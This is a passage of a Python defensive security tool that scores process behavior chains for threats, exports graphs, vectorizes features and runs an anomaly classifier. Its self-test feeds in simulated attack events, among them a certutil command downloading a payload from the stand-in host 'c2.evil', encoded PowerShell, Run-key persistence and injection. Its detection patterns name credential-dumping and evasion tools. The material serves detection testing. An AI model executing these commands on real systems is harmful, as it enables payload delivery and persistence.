        for n in nodes:
            if n.kind == NodeKind.PERSISTENCE:
                tech = n.attrs.get("technique", "T1547")
                findings.append(ChainFinding(
                    rule_id=f"PERSIST-{tech}",
                    label="Persistence artifact in chain",
                    score=20, technique=tech,
                    nodes=[n.node_id],
                    detail=n.attrs.get("detail", ""),
                ))
        return findings

    def _anomaly_score(self, chain_nodes: List[GraphNode]) -> float:
        """
        Z-score of chain length vs historical chains.
        Returns 0.0 if insufficient history.
        """
        depths = self._con.execute(
            """SELECT json_each.value as depth FROM chain_scores,
               json_each(json_extract(report, '$.chain_node_count'))
               LIMIT 200"""
        ).fetchall()

        if not depths or not _HAS_NUMPY:
            # stdlib fallback: simple ratio
            n = len(chain_nodes)
            return float(max(0.0, (n - 3) / 3.0))

        historical = np.array([float(r[0]) for r in depths])
        mean, std  = historical.mean(), historical.std()
        if std < 1e-6:
            return 0.0
        return float(abs(len(chain_nodes) - mean) / std)

    def score_chain(self, pid: int) -> Tuple[float, ChainReport]:
        """Score the entire behavior chain rooted at *pid*.

        Returns (total_score, ChainReport).
        """
        with self._lock:
            root_id = self._pid_to_node.get(pid)
            chain_nodes, chain_edges = self.get_full_chain(pid)

        if not chain_nodes:
            empty = ChainReport(
                root_pid=pid, chain_score=0.0, tier=ThreatTier.BENIGN,
                findings=[], chain_nodes=[], chain_edges=[],
                techniques=[], anomaly_score=0.0,
            )
            return 0.0, empty

        sequence = self._build_chain_sequence(chain_nodes)

        # gather all findings
        findings: List[ChainFinding] = []
        findings += self._match_rules(sequence)
        findings += self._score_individual_nodes(chain_nodes)
        findings += self._injection_bonus(chain_edges)
        findings += self._persistence_bonus(chain_nodes)

        total = sum(f.score for f in findings)
        anomaly = self._anomaly_score(chain_nodes)

        # Anomaly contributes up to +20 extra
        total += min(anomaly * 5.0, 20.0)

        tier       = ThreatTier.from_score(total)
        techniques = sorted({f.technique for f in findings})

        report = ChainReport(
            root_pid     = pid,
            chain_score  = total,
            tier         = tier,
            findings     = sorted(findings, key=lambda f: -f.score),
            chain_nodes  = chain_nodes,
            chain_edges  = chain_edges,
            techniques   = techniques,
            anomaly_score= anomaly,
        )

        # Persist for future anomaly baseline
        session_id = str(uuid.uuid4())
        rep_dict   = {
            "chain_node_count": [len(chain_nodes)],
            "score":            total,
        }
        with self._lock:
            self._con.execute(
                "INSERT OR REPLACE INTO chain_scores VALUES (?,?,?,?,?,?)",
                (session_id, root_id or str(pid), total, tier.name,
                 json.dumps(rep_dict), time.time()),
            )
            self._commit()

        log.warning(
            "Chain score pid=%d  score=%.1f  tier=%s  techniques=%s  nodes=%d",
            pid, total, tier.name, techniques, len(chain_nodes),
        )
        return total, report

    # ──────────────────────────────────────────────────────────────────────
    # Batch scoring – sweep all known process roots
    # ──────────────────────────────────────────────────────────────────────

    def sweep(self, min_tier: ThreatTier = ThreatTier.LOW
              ) -> List[ChainReport]:
        """Score all known process roots and return reports above min_tier."""
        with self._lock:
            pids = list(self._pid_to_node.keys())

        reports: List[ChainReport] = []
        for pid in pids:
            _, report = self.score_chain(pid)
            if report.tier >= min_tier:
                reports.append(report)
        return sorted(reports, key=lambda r: -r.chain_score)

    # ──────────────────────────────────────────────────────────────────────
    # Export helpers
    # ──────────────────────────────────────────────────────────────────────

    def export_json(self, path: str) -> None:
        """Dump the entire graph to a JSON file for archiving / SIEM ingest."""
        with self._lock:
            nodes = self._con.execute(
                "SELECT node_id,kind,label,attrs,first_seen,last_seen FROM nodes"
            ).fetchall()
            edges = self._con.execute(
                "SELECT edge_id,src,dst,kind,attrs,ts FROM edges"
            ).fetchall()

        data = {
            "exported_at": time.time(),
            "nodes": [
                {"node_id": r[0], "kind": r[1], "label": r[2],
                 "attrs": json.loads(r[3]), "first_seen": r[4], "last_seen": r[5]}
                for r in nodes
            ],
            "edges": [
                {"edge_id": r[0], "src": r[1], "dst": r[2], "kind": r[3],
                 "attrs": json.loads(r[4]), "ts": r[5]}
                for r in edges
            ],
        }
        Path(path).write_text(json.dumps(data, indent=2), encoding="utf-8")
        log.info("Graph exported → %s  (%d nodes, %d edges)",
                 path, len(data["nodes"]), len(data["edges"]))

    def export_dot(self, path: str) -> None:
        """Export a Graphviz DOT file for visual inspection."""
        _COLORS = {
            NodeKind.PROCESS:     "#4A90D9",
            NodeKind.FILE:        "#7ED321",
            NodeKind.REGISTRY:    "#F5A623",
            NodeKind.NETWORK:     "#D0021B",
            NodeKind.PERSISTENCE: "#9B59B6",
            NodeKind.THREAD:      "#1ABC9C",
        }
        with self._lock:
            nodes = self._con.execute(
                "SELECT node_id,kind,label FROM nodes"
            ).fetchall()
            edges = self._con.execute(
                "SELECT src,dst,kind FROM edges"
            ).fetchall()

        lines = ['digraph ThreatGraph {', '  rankdir=LR;',
                 '  node [shape=box style=filled fontname="Helvetica"];']
        for nid, kind, label in nodes:
            color = _COLORS.get(NodeKind(kind), "#AAAAAA")
            safe  = label[:40].replace('"', "'")
            lines.append(f'  "{nid}" [label="{safe}" fillcolor="{color}"];')
        for src, dst, kind in edges:
            lines.append(f'  "{src}" -> "{dst}" [label="{kind}"];')
        lines.append("}")
        Path(path).write_text("\n".join(lines), encoding="utf-8")
        log.info("DOT graph exported → %s", path)

    def stats(self) -> Dict[str, Any]:
        """Return aggregate statistics about the graph."""
        with self._lock:
            n_nodes = self._con.execute("SELECT COUNT(*) FROM nodes").fetchone()[0]
            n_edges = self._con.execute("SELECT COUNT(*) FROM edges").fetchone()[0]
            by_kind = self._con.execute(
                "SELECT kind, COUNT(*) FROM nodes GROUP BY kind"
            ).fetchall()
            n_scores = self._con.execute(
                "SELECT COUNT(*), AVG(score), MAX(score) FROM chain_scores"
            ).fetchone()

        return {
            "nodes":           n_nodes,
            "edges":           n_edges,
            "by_node_kind":    {k: v for k, v in by_kind},
            "chains_scored":   n_scores[0],
            "avg_chain_score": round(n_scores[1] or 0, 2),
            "max_chain_score": round(n_scores[2] or 0, 2),
        }

    def close(self) -> None:
        with self._lock:
            self._con.close()

    def __enter__(self) -> "ThreatGraph":
        return self

    def __exit__(self, *_: Any) -> None:
        self.close()


# ═══════════════════════════════════════════════════════════════════════════
# LSTM/Transformer behavioral sequence classifier (pure numpy)
# ═══════════════════════════════════════════════════════════════════════════

class BehaviorVectorizer:
    """Converts a list of GraphNodes into a fixed-length feature vector.

    This is the featurization layer that feeds into any downstream ML model.
    Designed to be compatible with torch-based LSTM/Transformer classifiers
    as well as the numpy-only anomaly scorer below.

    Feature schema (64-dim):
        [0]      chain length (log-scaled)
        [1]      # process nodes
        [2]      # file nodes
        [3]      # registry nodes
        [4]      # network nodes
        [5]      # persistence nodes
        [6]      # spawned edges
        [7]      # injection edges
        [8-37]   one-hot presence of top-30 LOLBin names in chain
        [38-55]  one-hot presence of top-18 high-risk label patterns
        [56]     max depth of spawn tree
        [57]     ratio of suspicious → total nodes
        [58]     has encoded command flag
        [59]     has network contact flag
        [60]     has persistence artifact flag
        [61]     has injection edge flag
        [62]     has office-parent flag
        [63]     has credential-access flag
    """

    _LOLBINS = [
        "certutil","rundll32","regsvr32","mshta","installutil","msbuild",
        "regasm","regsvcs","cmstp","msiexec","odbcconf","bitsadmin",
        "powershell","pwsh","cmd","wscript","cscript","wmic","schtasks",
        "reg","wevtutil","netsh","net","nltest","whoami","psexec",
        "procdump","vssadmin","taskkill","csc",
    ]
    _LOLBIN_SET = frozenset(_LOLBINS)

    _RISK_PATS = [
        re.compile(p, re.I) for p in [
            r"-enc(odedcommand)?", r"iex|invoke-expression",
            r"downloadstring|downloadfile", r"virtualalloc|createthread",
            r"mimikatz|sekurlsa", r"amsiutils|set-mppreference",
            r"shadowcopy.*delete", r"lsass", r"currentversion\\run",
            r"schtasks.*create", r"base64", r"\\temp\\.*(exe|dll|ps1)",
            r"psexec.*\\\\", r"wmic.*process.*call",
            r"fodhelper|eventvwr", r"procdump.*lsass",
            r"net\s+user.*\/add", r"wevtutil.*\bcl\b",
        ]
    ]

    _OFFICE = frozenset(["winword","excel","powerpnt","outlook","onenote","msaccess"])

    def vectorize(self, nodes: List[GraphNode],
                  edges: List[GraphEdge]) -> "list[float]":
        vec = [0.0] * 64

        kind_counts = collections.Counter(n.kind for n in nodes)
        n = len(nodes)
        vec[0] = math.log1p(n)
        vec[1] = kind_counts[NodeKind.PROCESS]
        vec[2] = kind_counts[NodeKind.FILE]
        vec[3] = kind_counts[NodeKind.REGISTRY]
        vec[4] = kind_counts[NodeKind.NETWORK]
        vec[5] = kind_counts[NodeKind.PERSISTENCE]

        edge_kinds = collections.Counter(e.kind for e in edges)
        vec[6] = edge_kinds[EdgeKind.SPAWNED]
        vec[7] = edge_kinds[EdgeKind.INJECTED_INTO]

        all_labels = " ".join(nd.label for nd in nodes).lower()

        # LOLBin one-hot [8..37]
        for i, lb in enumerate(self._LOLBINS):
            if lb in all_labels:
                vec[8 + i] = 1.0

        # Risk pattern one-hot [38..55]
        for i, pat in enumerate(self._RISK_PATS):
            if pat.search(all_labels):
                vec[38 + i] = 1.0

        # Max depth of spawn tree
        spawn_depth = max((vec[6], 1))
        vec[56] = math.log1p(spawn_depth)

        # Ratio suspicious/total nodes
        suspicious = sum(1 for nd in nodes
                         if any(p.search(nd.label) for p in self._RISK_PATS[:5]))
        vec[57] = suspicious / max(n, 1)

        vec[58] = 1.0 if re.search(r"-enc(odedcommand)?", all_labels, re.I) else 0.0
        vec[59] = 1.0 if kind_counts[NodeKind.NETWORK]      > 0 else 0.0
        vec[60] = 1.0 if kind_counts[NodeKind.PERSISTENCE]  > 0 else 0.0
        vec[61] = 1.0 if edge_kinds[EdgeKind.INJECTED_INTO] > 0 else 0.0
        vec[62] = 1.0 if any(
            nd.attrs.get("name", "") in self._OFFICE for nd in nodes
        ) else 0.0
        vec[63] = 1.0 if re.search(r"mimikatz|sekurlsa|lsadump|procdump", all_labels, re.I) else 0.0

        return vec


class NumpyAnomalyClassifier:
    """
    Lightweight numpy-based anomaly detector.

    Builds a rolling mean/std profile from historical behavior vectors
    and computes Mahalanobis-style distances to flag outliers.

    In production you would replace this with:
        • A trained LSTM on sequences of API-call opcodes
        • A Transformer encoder fine-tuned on malware sandbox traces
        • HDBSCAN clustering for unseen-family detection

    This class is deliberately structured to be a drop-in replacement:
    it exposes .fit(vectors) and .predict(vector) → (score, is_anomaly).
    """

    def __init__(self, contamination: float = 0.05) -> None:
        self._contamination = contamination
        self._mean: Optional["np.ndarray"]     = None
        self._std:  Optional["np.ndarray"]     = None
        self._threshold: float                  = float("inf")
        self._history: List[List[float]]        = []

    def fit(self, vectors: List[List[float]]) -> None:
        if not _HAS_NUMPY or len(vectors) < 5:
            return
        X = np.array(vectors, dtype=np.float32)
        self._mean = X.mean(axis=0)
        self._std  = X.std(axis=0) + 1e-6
        # Compute all distances to set threshold at the contamination percentile
        dists = [self._distance(v.tolist()) for v in X]
        self._threshold = float(np.percentile(dists, 100 * (1 - self._contamination)))
        log.info("Anomaly classifier fitted on %d samples  threshold=%.3f",
                 len(vectors), self._threshold)

    def update(self, vector: List[float]) -> None:
        """Incremental online update (keeps last 1000 samples)."""
        self._history.append(vector)
        if len(self._history) > 1000:
            self._history.pop(0)
        if len(self._history) >= 10:
            self.fit(self._history)

    def _distance(self, vector: List[float]) -> float:
        if not _HAS_NUMPY or self._mean is None:
            return 0.0
        v   = np.array(vector, dtype=np.float32)
        std = self._std if self._std is not None else np.ones_like(v)
        return float(np.sqrt(np.sum(((v - self._mean) / std) ** 2)))

    def predict(self, vector: List[float]) -> Tuple[float, bool]:
        """Returns (anomaly_distance, is_anomaly_bool)."""
        if self._mean is None:
            return 0.0, False
        dist = self._distance(vector)
        return dist, dist > self._threshold

    def cluster_label(self, vectors: List[List[float]]) -> List[int]:
        """
        Naive k-means cluster labelling (k=5) for grouping unknown binaries.
        Returns list of cluster ids.  Replace with HDBSCAN for production.
        """
        if not _HAS_NUMPY or len(vectors) < 5:
            return [0] * len(vectors)

        X  = np.array(vectors, dtype=np.float32)
        k  = min(5, len(vectors))
        rng = np.random.default_rng(42)
        centroids = X[rng.choice(len(X), k, replace=False)]

        for _ in range(50):   # max iterations
            dists  = np.linalg.norm(X[:, None] - centroids[None], axis=2)  # N×k
            labels = dists.argmin(axis=1)
            new_c  = np.array([X[labels == j].mean(axis=0) if (labels == j).any()
                                else centroids[j]
                                for j in range(k)])
            if np.allclose(centroids, new_c, atol=1e-4):
                break
            centroids = new_c

        return labels.tolist()


# ═══════════════════════════════════════════════════════════════════════════
# Self-test
# ═══════════════════════════════════════════════════════════════════════════

def _self_test() -> None:
    logging.basicConfig(level=logging.WARNING,
                        format="%(asctime)s %(levelname)-8s %(message)s")
    print("=" * 70)
    print("ThreatGraph self-test")
    print("=" * 70)

    with ThreatGraph(":memory:") as g:

        # ── Scenario 1: Office macro → PS → downloader → C2 ──────────────
        print("\n[Scenario 1] Office → PowerShell → Certutil → Network")
        g.add_process(pid=1000, name="services.exe",     ppid=0)
        g.add_process(pid=1200, name="explorer.exe",     ppid=1000)
        g.add_process(pid=4242, name="WINWORD.EXE",      ppid=1200,
                      cmdline="WINWORD.EXE /n malicious.docx")
        g.add_process(pid=5001, name="powershell.exe",   ppid=4242,
                      cmdline="-NoP -NonI -W Hidden -Enc QQBsAGkAYwBlAA==")
        g.add_process(pid=5800, name="cmd.exe",          ppid=5001,
                      cmdline='/c certutil -urlcache -f http://c2.evil/p.exe payload.exe')
        g.add_process(pid=5900, name="certutil.exe",     ppid=5800,
                      cmdline="-urlcache -f http://c2.evil/p.exe payload.exe")
        g.add_file_event(pid=5900, path=r"C:\Temp\payload.exe", operation="write")
        g.add_network_event(pid=5900, remote_ip="203.0.113.42",
                             remote_port=80, domain="c2.evil")

        score1, report1 = g.score_chain(pid=5900)
        print(report1.summary())
        assert score1 >= 60, f"Expected score >= 60, got {score1}"
        print(f"✓  Score {score1:.1f}  [{report1.tier.name}]  — PASS\n")

        # ── Scenario 2: Registry run-key persistence ───────────────────────
        print("[Scenario 2] Registry Run key persistence")
        g.add_process(pid=6000, name="dropper.exe", ppid=5900,
                      cmdline=r"C:\Temp\payload.exe")
        g.add_registry_event(pid=6000,
            key_path=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            value=r"C:\Temp\payload.exe", operation="set")

        score2, report2 = g.score_chain(pid=6000)
        print(report2.summary())
        assert score2 >= 40, f"Expected score >= 40, got {score2}"
        print(f"✓  Score {score2:.1f}  [{report2.tier.name}]  — PASS\n")

        # ── Scenario 3: Process injection ─────────────────────────────────
        print("[Scenario 3] Process injection into svchost")
        g.add_process(pid=7000, name="svchost.exe", ppid=1000,
                      cmdline="-k netsvcs")
        g.add_process(pid=6001, name="evil_injector.exe", ppid=5900)
        g.add_injection_event(src_pid=6001, dst_pid=7000, technique="T1055.012")

        score3, report3 = g.score_chain(pid=6001)
        assert score3 >= 25, f"Expected score >= 25, got {score3}"
        print(f"✓  Injection score {score3:.1f}  [{report3.tier.name}]  — PASS")

        # ── Scenario 4: Benign chain ───────────────────────────────────────
        print("\n[Scenario 4] Benign process chain (notepad)")
        g.add_process(pid=9000, name="explorer.exe", ppid=1000)
        g.add_process(pid=9001, name="notepad.exe",  ppid=9000,
                      cmdline=r"notepad.exe C:\Users\alice\report.txt")
        g.add_file_event(pid=9001,
                          path=r"C:\Users\alice\report.txt", operation="read")

        score4, report4 = g.score_chain(pid=9001)
        assert score4 < 40, f"Expected score < 40, got {score4}"
        print(f"✓  Benign score {score4:.1f}  [{report4.tier.name}]  — PASS")

        # ── Vectorizer + anomaly classifier ───────────────────────────────
        print("\n[Scenario 5] Behavior vectorizer + anomaly classifier")
        vectorizer  = BehaviorVectorizer()
        classifier  = NumpyAnomalyClassifier(contamination=0.1)

        # train on "benign" vectors (random low-value)
        if _HAS_NUMPY:
            import numpy as _np
            rng     = _np.random.default_rng(0)
            benign  = rng.uniform(0, 0.2, (50, 64)).tolist()
            classifier.fit(benign)

            nodes1, edges1 = g.get_full_chain(5900)
            vec1 = vectorizer.vectorize(nodes1, edges1)
            dist, is_anom = classifier.predict(vec1)
            print(f"  Malicious chain  dist={dist:.3f}  is_anomaly={is_anom}")
            assert is_anom, "Malicious chain should be flagged as anomaly"

            nodes2, edges2 = g.get_full_chain(9001)
            vec2 = vectorizer.vectorize(nodes2, edges2)
            dist2, is_anom2 = classifier.predict(vec2)
            print(f"  Benign chain     dist={dist2:.3f}  is_anomaly={is_anom2}")
            print("✓  Anomaly classifier  — PASS")
        else:
            print("  (numpy not available – skipping anomaly classifier test)")

        # ── Export ─────────────────────────────────────────────────────────
        g.export_json("/tmp/threat_graph_export.json")
        g.export_dot("/tmp/threat_graph.dot")
        print("\n✓  JSON + DOT exported  — PASS")

        # ── Stats ──────────────────────────────────────────────────────────
        s = g.stats()
        print(f"\nGraph stats: {s}")

    print("\n" + "=" * 70)
    print("All self-tests passed.")
    print("=" * 70)


if __name__ == "__main__":
    _self_test()